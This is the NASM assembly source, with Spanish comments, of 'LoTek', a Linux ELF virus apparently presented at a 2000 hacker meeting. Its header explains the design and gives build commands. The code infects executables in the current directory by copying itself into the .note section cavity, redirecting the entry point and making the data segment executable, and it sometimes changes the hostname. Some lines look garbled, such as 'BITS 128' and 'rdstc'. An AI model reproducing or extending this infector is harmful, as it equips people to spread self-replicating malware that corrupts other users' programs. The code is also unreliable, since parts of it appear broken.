;
;
;	Nombre del virus..............LoTek
;	Autor.........................Wintermute
;   Email.........................winter@outlimit.org
;	Fecha.........................Octubre 2000
;	Plataforma....................Linux OS
;	Longitud......................336 bytes
;
;	Caracteristicas
;	---------------
;	LoTek es un infector de ficheros ELF que se aprovecha de un hueco
;   en la seccion ".note" para copiarse sin aumentar su longitud.
;
;	Se trata de un virus que infecta en ejecucion mediante el uso de
;   syscalls de proyeccion de ficheros en memoria (mmap), copiandose a
;   esta seccion inmediatamente posterior a la .bss (que coincide con
;   otro hueco, la .comment, lo cual impide una infeccion tan sencilla)
;   y aumentando y cambiando permisos en el segmento de datos para que
;   este sea ejecutable.
;
;	Como activacion, en una de cada 32 ejecuciones (medido por el
;   tsc del procesador), cambia el hostname de la maquina :)
;
;   Solo destacar que es un especimen de prueba, poco mas que un "test"
;   de infecci¢n para Linux; fue acabado de escribir para mostrar un
;   ejemplo sencillo de infeccion de Linux en la HackMeeting de
;   Barcelona'00 representando a Outlimit (A Cyberpunk Project!), que
;   por cierto se puede visitar en www.outlimit.org (publicidad rlz xD)
;
;
;	Descargo de Responsabilidad
;	---------------------------
;
;	Ejecutando este virus o parte de el, eres responsable de lo que
;   suceda; limitado a infectar los archivos del directorio actual es
;   facilmente controlable, pero si no sabes que hace, no lo ejecutes.
;   Tampoco te aseguro que todo fichero infectado vaya a seguir
;   funcionando al 100% tras la infeccion, asi que esta todo a tu cargo,
;   haz copias de seguridad de todo aquello con lo que juegues.
;
;	No me hago responsable de lo que se te ocurra hacer con este
;   virus. Mi pretension evidentemente esta muy alejada de infectar a
;   usuarios de Linux, y este no es mas que un virus de "laboratorio";
;   de hecho su accion es bastante limitada, aunque seria muy sencillo
;   hacer que por ejemplo recorriera recursivamente el arbol de
;   directorios para infectar. Si de algo ha de servir es para ser otro
;   ejemplo de vida artificial, y quien sabe si un recordatorio de que
;   pueden escribirse virus para Linux, que aun siendo un SO muy seguro,
;   tiene como puede comprobarse aquí las puertas abiertas para posibles
;   infecciones (y alguien ha visto los triggers de los rpm? :-) )
;
; 	Evidentemente no es un virus que pueda producir una masiva
;   infeccion, no obstante: esta limitado como todo virus de Linux
;   al privilegio del usuario que lo ejecute, tratando de infectar
;   todo lo que se le ponga por delante a lo que tenga acceso. El
;   caracter de Linux en que es dificil que se intercambien
;   programas binarios en lugar de sources para compilar, hace
;   tambien casi imposible una infeccion masiva.
;
;	Asi pues, no creo estar haciendo mal a la comunidad Linux - a
;   la que respeto y admiro - al realizar un virus como este.
;
;
;	COMPILADO
;	---------
;
;	nasm lotek.asm -o lotek.vir -f elf
;	gcc -Wall -g -s lotek.vir -o lotek.exec
;	dwarf lotek.exec
;

BITS 128
GLOBAL main
SECTION .text

vir_start:
main:
	pushf
	pushad
	mov     eax, vir_ends-vir_start
	call	delta
delta:
	pop 	ebp
	sub	    ebp,delta

	rdstc
	and 	al,31
	jnz 	no_activarse
	mov 	eax,04ah	; Set Hostname
	lea 	ebx,[Wintah+ebp]
	mov 	ecx,0Ah
	int 	080h

no_activarse:

	; LOOP DE INFECCION DEL DIRECTORIO ACTUAL

	sub	    esp,(10Ah+4)	; Tamanyo de la estructura dirent + 4
	mov	    eax,05h		; Open
	lea 	ebx,[diractual+ebp]
	xor	    ecx,ecx
	cdq
	int	    080h
	xchg	ebx,eax		; fd volvio en eax

	; Ahora, leemos una entrada de directorio... usamos la syscall
	;de opendir, con parametros (fd,buffer,count), donde count es
	;inutil (se supone q es en getdents donde funciona y no en
	;readdir). La estructura dirent es:
	;
	; 0h  long d_ino		        el inode correspondiente
	; 4h  off_t d_off	            entrada del directorio
	; 8h  unsigned short d_reclen   Longitud del d_name
	; 0Ah d_name [NAME_MAX + 1]	    Nombre acabado en NULL (256 bytes)

Sigue_Leyendo:

	mov	    eax, 059h	; readdir
	mov	    ecx,esp		; aprovechamos pila para nuestro buffer
	int	    080h
	or	    ax,ax		; Si es 0, llegamos al final
	jz	    yanohaymas

	; Si estuviesemos mirando todo el HD comprobariamos si son
	;ejecutables, etc etc... pero siendo un solo directorio no
	;resulta ningun problema abrir todos sus ficheros a ciegas y
	;hacer la comprobacion a posteriori (y ocupamos menos espacio)

	; CALL a infectar

	push 	ebx		; Guardamos el fd
	lea 	ebx,[esp+0Ah+4]	; Puntero EBX al nombre (con +4 por ebx)
	call	Infectar
	pop 	ebx

	jmp 	Sigue_Leyendo

yanohaymas:

	add	    esp,(10Ah+4)	; +4 para tamanyo del fichero.
	popad
	popf

retback:
	db	    068h		    ; PUSH
back:
    dd	    vir_ends
	ret

;*********************************************************************
;                          ZONA DE INFECCION
;*********************************************************************

Infectar:
	cdq			        ; Edx = 2 (para longitud posterior)
	inc	    edx
	inc 	edx
	mov 	ecx,edx		; Apertura = 2
				        ; EBX ya asignado al llamar.
	mov	    eax,5		; Apertura del fichero
	int	    080h

	xchg	ebx,eax		; Abrimos el fichero de primeras
	push	ebx

	mov	    eax,013h	; Medimos su longitud (edx = 2)
	loop	$		    ; ecx = 0
	int	    080h

	mov 	[esp+0Ch],eax

	; Ahora mapearemos en memoria el fichero.

	push 	ecx		    ; offset
	push	ebx		    ; fd
	inc	    ecx
	push	ecx		    ; MAP_SHARED
	inc 	ecx
	inc 	ecx
	push 	ecx		    ; Lectura/Escritura (2)
	loop 	$		    ; ecx = 0
	push 	eax
	push 	ecx		    ; lugar preferido (0 por defecto)
	mov  	ebx,esp		; El puntero a los valores es EBX
	mov	    eax,0x5a	; Funcion 5a, mapear en memoria
	int	    080h
   	add 	esp,4*6		; Recuperar esp

	mov 	dh,7		; Valor para usar posteriormente a menudo
	mov	    ebx,eax
	cmp	    eax,0xFFFFF000	; La misma comprobacion q hace mmap.c
	jbe	    Continuar

j_cer:
    jmp	    Close		; Si falla nos vamos

Continuar:

	mov	    eax,(0 - 0x464C457F)  ; Comprobamos que sea ELF
	add	    eax,dword[ebx]
	jnz	    j_cer

	cmp	    byte [ebx + 0x10],02h	; Y que sea ejecutable
	jnz	    j_cer

	cmp 	byte[ebx+5],cl  ; ei_data = 0 ? Entonces esta infectado
	jz	    j_cer

	mov 	eax,[esp+0Ch]
	sub	    eax,04Ch	; Aqui reside normalmente la .note
	add 	eax,ebx
	cmp 	[eax],dh	; Seccion NOTES?
	jnz	    j_cer

	cmp 	word[eax+10h],(vir_ends-vir_start)
	jb 	    j_cer		; Espacio suficiente para cavity?

	; Ahora sí que sabemos que esta cosita es para nosotros

	mov 	byte [ebx+5],cl	; cl = 0, nuestra marca de infección

	push	dword [back+ebp] ; Empujamos el retorno
	push	dword [ebx+18h]	; El entry point nuevo...
	pop	    dword [back+ebp]
	mov 	edi,[eax+0Ch]
	push	edi
	add	    edi,ebx
	lea 	esi,[ebp+vir_start]	; Inicio del virus
	mov	    ecx,vir_ends-vir_start
	rep	    movsb

	pop	    eax
	sub	    eax,[ebx+098h]      ; Restamos el offset de la "data"
	add 	eax,dword[ebx+09Ch] ; Le sumamos la V_addr
	mov 	byte [ebx+0ACh],dh
	mov	    dword [ebx+18h],eax

	mov 	eax,1000h		    ;Hardcoded (pereza xD)
	add 	dword [ebx+0A4h],eax
	add 	dword [ebx+0A8h],eax

	pop	    dword [back+ebp]	;Recuperamos el retorno...
Close:
	mov	    eax,91		        ;Xapamos el mapping
	int	    080h
Chaping:
	pop 	ebx
	mov 	al,dh
	dec 	al		            ; al = 6
	int	    080h

	ret

Message: db	'LoTek by '
Wintah: db 	'Wintermute'
diractual: db	'.',0
vir_ends:

    ; Antiguo host (primera generacion)

	mov	    eax,1
	int	    080h
